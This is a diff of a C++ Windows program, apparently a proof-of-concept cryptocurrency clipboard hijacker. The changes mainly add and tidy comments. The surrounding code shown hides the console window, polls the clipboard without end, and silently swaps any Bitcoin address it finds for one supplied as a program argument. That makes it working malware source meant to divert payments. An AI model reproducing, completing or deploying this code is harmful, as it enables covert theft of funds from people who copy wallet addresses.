@@ -6,6 +6,7 @@
 using namespace std;
 
 string WaitForClipboardUpdate(string oldValue) {
+	//A lot of nesting here, could be worse.
 	for (;;) { //This could get stuck in an infinite loop by a value being invalid but - I'm not worried for a proof-of-concept.
 		if (OpenClipboard(NULL)) {
 			if (IsClipboardFormatAvailable(CF_TEXT)) { //Confirms the data in the clipboard is plain text.
@@ -44,22 +45,22 @@ void SetClipboard(const string value) {
 }
 
 bool isBitcoinAddress(string value) {
-	regex bitcoinRegex("^[13][a-km-zA-HJ-NP-Z1-9]{25,34}$");
+	regex bitcoinRegex("^[13][a-km-zA-HJ-NP-Z1-9]{25,34}$"); //Regex to match Bitcoin address format.
 	smatch matches;
 	return regex_search(value, matches, bitcoinRegex);
 }
 
 int main(int n_args, char* args[]) {
 	::ShowWindow(::GetConsoleWindow(), SW_HIDE);
-	//Hide's the console in the background.
+	//Hides the console in the background.
 	//I could've used something such as WinMain but I don't want to change the entry point.
 	string
 		bitcoin_address = n_args > 1 ? args[1] : "different-bitcoin-address",
 		clipboardText = "";
 
 	for (;;) {
-		clipboardText = WaitForClipboardUpdate(clipboardText);
-		if (isBitcoinAddress(clipboardText)) SetClipboard(bitcoin_address); //Changes the clipboard if it contains a bitcoin address
+		clipboardText = WaitForClipboardUpdate(clipboardText); //Only returns once the clipboards' content changes.
+		if (isBitcoinAddress(clipboardText)) SetClipboard(bitcoin_address); //Changes the clipboard if it contains a bitcoin address.
 	}
 	return 0;
 }
